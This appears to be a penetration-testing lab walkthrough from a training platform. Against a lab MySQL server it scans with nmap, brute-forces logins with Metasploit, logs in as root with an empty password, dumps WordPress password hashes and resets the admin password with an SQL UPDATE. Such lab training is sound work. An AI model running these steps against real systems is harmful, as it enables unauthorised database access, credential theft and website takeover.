
**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/17f230734f0c2e199de91742cb9d6d9344790b0599b7dbb2deb6116993bc0ff3.png)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/b44dc04ac5145b8c71eb0b85beeddd611a98da6bc405ded91017b656c2e71acc.png)

The target is reachable.

**Step 3:** Port scanning with Nmap

In this lab, we will be targeting the MySQL port, as a result, we can limit our Nmap scan to port 3306.

We can identify vulnerabilities or misconfigurations on the MySQL port by performing a Nmap script scan with the default Nmap script option. This can be done by running the following command:

**Command:**

```
nmap -sV -sC -p 3306 demo.ine.local
```

As shown in the following screenshot, the default Nmap script reveals the specific version of MySQL running on the target.

![Content Image](https://assets.ine.com/lab/learningpath/f6fc593f6535dee6798fc475f8bea3dc443838094c450f39e9c7f882eec85b0d.png)

**Step 4:** Searching for exploits with Searchsploit

Now that we have identified the specific version of MySQL running on the target, we can utilize a tool like Searchsploit to search for exploits that affect this specific version of MySQL. This can be done by running the following command:

**Command:**

```
searchsploit MySQL 5.5
```

![Content Image](https://assets.ine.com/lab/learningpath/a4bb04261ff1fe5edf1a539c3e7919793c74c23ee28cd617307ff8663c5fff89.png)

**Step 5:** MySQL brute force

We can perform a brute force attack on the MySQL database server to identify legitimate credentials that we can use to authenticate with the server and consequently gain control of the databases being hosted on the server.

To perform the brute force attack, we can use the **auxiliary/scanner/mysql/mysql_login** Metasploit module.

To begin with, we will need to start the Metasploit Framework console (msfconsole), this can be done by running the following command:

**Command:**

```
msfconsole
```

We can now load the module by running the following command:

**Command:**

```
use auxiliary/scanner/mysql/mysql_login
```

After loading the module, we will need to configure the module options. One of the options we need to configure is the target address, this can be done by running the following command:

**Command:**

```
set RHOSTS demo.ine.local
```

We will also need to set the wordlist for the password brute force, this can be done by running the following command:

**Command:**

```
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
```

![Content Image](https://assets.ine.com/lab/learningpath/429074b329092aa9559e812cd930dab57ac496bb4e0634870f015c92ca5ef66f.png)

After configuring the module options, we can execute the module:

**Command:**

```
run
```

As shown in the following screenshot, the brute force attack reveals that the MySQL password for the **root** user is **NULL** which means that we can log in to the MySQL database server with the root user account without providing a password!

![Content Image](https://assets.ine.com/lab/learningpath/e9a70932425e9df8d62c1dd65864269e6b80c9f9ee394215b9397e07ddde51bb.png)

**Step 6:** Authenticating to the MySQL database server

Given that we have identified the root user password for the MySQL database server, we can remotely authenticate the MySQL database server by running the following command:

**Command:**

```
mysql -u root -p -h demo.ine.local
```

As shown in the following screenshot, you will be prompted to enter the password for the **root** user, however, you do not need to enter any password.

![Content Image](https://assets.ine.com/lab/learningpath/266df1faf4e82ef8fa5833502237364fc3aa8581e80c2dfcc5e793827549c0ec.png)

After successfully authenticating with the MySQL database server, you will be provided with the MySQL console. We can use our access to display the databases being hosted and dump the data contained within them.

We can display the list of databases being hosted on the MySQL database server by running the following command:

**Command:**

```
show databases;
```

As shown in the following screenshot, the MySQL database server has 5 databases being hosted. The **wordpress** database looks interesting.

![Content Image](https://assets.ine.com/lab/learningpath/cb9e30e0e7e447525497321b69d71513c0db8da0e1370fdeaa9e10519845ceaa.png)

We can select the **wordpress** database by running the following command:

**Command:**

```
use wordpress;
```

After selecting the **wordpress** database, we can display the tables stored within the database by running the following command:

**Command:**

```
show tables;
```

![Content Image](https://assets.ine.com/lab/learningpath/07c7ed3885f7cdc1f859be9c7178b357c97f13aa40f99954fc20b8f59d19151b.png)

We can view the various WordPress user accounts in the **wp_users** table by running the following command:

**Command:**

```
select * from wp_users;
```

![Content Image](https://assets.ine.com/lab/learningpath/96b16378fd3e86569e7f2328465d5d41542d79c68fefc21ad6fec9ead23fe9ed.png)

From this point, we can copy the password hashes displayed in the **user_pass** column. Alternatively, we can also change the password for the admin user so that we can log in to the WordPress site being hosted on the WAMP server we identified in an earlier lab.

This can be done by running the following command:

**Command:**

```
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```

![Content Image](https://assets.ine.com/lab/learningpath/6602252ae18ce0ed5389016587aae4afa472d496cbf076a8db7e5f691e55a336.png)

We can now navigate to the WordPress site via a browser by accessing the following URL:

**URL:** [http://demo.ine.local:8585/wordpress/wp-admin]

You will now be prompted to log in, you can log in with the username **admin** and the password **password123** as shown in the following screenshot.

![Content Image](https://assets.ine.com/lab/learningpath/d328cb92d3e8a17a708b383e6c86cb0d819ab8f64a3b042d4f16147ea185c7b4.png)

![Content Image](https://assets.ine.com/lab/learningpath/a7d8b7d3b98dd808a46adc3755de727c8705aba2222ca02f80b23a2a51d79778.png)

We have been able to successfully gain access to the MySQL database server and modify the WordPress admin user account password consequently gaining administrative control over the WordPress site.